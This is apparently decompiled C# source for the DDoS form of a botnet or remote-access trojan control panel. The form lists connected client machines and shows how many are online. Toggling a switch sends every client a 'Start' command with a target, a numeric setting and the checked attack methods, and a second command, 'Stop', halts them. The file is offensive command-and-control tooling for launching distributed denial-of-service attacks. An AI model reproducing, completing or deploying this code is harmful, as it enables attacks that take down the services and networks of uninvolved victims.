using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Threading.Tasks;
using System.Windows.Forms;
using CustomControls.RJControls;
using MaterialSkin;
using MaterialSkin.Controls;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms
{
	// Token: 0x020000B1 RID: 177
	public partial class FormDDos : FormMaterial
	{
		// Token: 0x0600057E RID: 1406 RVA: 0x0004F55B File Offset: 0x0004D75B
		public FormDDos()
		{
			this.InitializeComponent();
			base.FormClosing += this.Closing1;
		}

		// Token: 0x0600057F RID: 1407 RVA: 0x0004F586 File Offset: 0x0004D786
		private void FormProcess_Load(object sender, EventArgs e)
		{
			MaterialSkinManager.Instance.ThemeChanged += this.ChangeScheme;
			this.ChangeScheme(this);
			this.timer1.Start();
		}

		// Token: 0x06000580 RID: 1408 RVA: 0x0004F5B0 File Offset: 0x0004D7B0
		private void Closing1(object sender, FormClosingEventArgs e)
		{
			this.work = false;
			Clients[] array = this.clients.ToArray();
			for (int i = 0; i < array.Length; i++)
			{
				Clients client = array[i];
				Task.Run(delegate()
				{
					client.Disconnect();
				});
			}
			base.Hide();
			e.Cancel = true;
			this.materialSwitch7.Checked = false;
		}

		// Token: 0x06000581 RID: 1409 RVA: 0x0004F616 File Offset: 0x0004D816
		private void timer1_Tick(object sender, EventArgs e)
		{
			this.Text = string.Format("DDos           Online [{0}]", this.clients.Count);
		}

		// Token: 0x06000582 RID: 1410 RVA: 0x0004F638 File Offset: 0x0004D838
		private void ChangeScheme(object sender)
		{
			this.rjTextBox1.BorderColor = FormMaterial.PrimaryColor;
			this.rjButton1.BorderColor = FormMaterial.PrimaryColor;
			this.rjButton1.ForeColor = FormMaterial.PrimaryColor;
			this.numericUpDown2.ForeColor = FormMaterial.PrimaryColor;
		}

		// Token: 0x06000583 RID: 1411 RVA: 0x0004F688 File Offset: 0x0004D888
		private void materialSwitch7_CheckedChanged(object sender, EventArgs e)
		{
			if (string.IsNullOrEmpty(this.rjTextBox1.Texts))
			{
				return;
			}
			Clients[] array;
			if (this.materialSwitch7.Checked)
			{
				List<object> list = new List<object>
				{
					"Start",
					this.rjTextBox1.Texts,
					(int)this.numericUpDown2.Value
				};
				foreach (object obj in this.panel2.Controls)
				{
					Control control = (Control)obj;
					if (control is CheckBox)
					{
						CheckBox checkBox = (CheckBox)control;
						if (checkBox.Checked)
						{
							list.Add(checkBox.Text.Replace(" ", ""));
						}
					}
				}
				array = this.clients.ToArray();
				for (int i = 0; i < array.Length; i++)
				{
					array[i].Send(list.ToArray());
				}
				return;
			}
			array = this.clients.ToArray();
			for (int i = 0; i < array.Length; i++)
			{
				array[i].Send(new object[]
				{
					"Stop"
				});
			}
		}

		// Token: 0x06000584 RID: 1412 RVA: 0x0004F7E0 File Offset: 0x0004D9E0
		private void rjButton1_Click(object sender, EventArgs e)
		{
			base.Hide();
		}

		// Token: 0x04000432 RID: 1074
		public bool work;

		// Token: 0x04000433 RID: 1075
		public List<Clients> clients = new List<Clients>();
	}
}
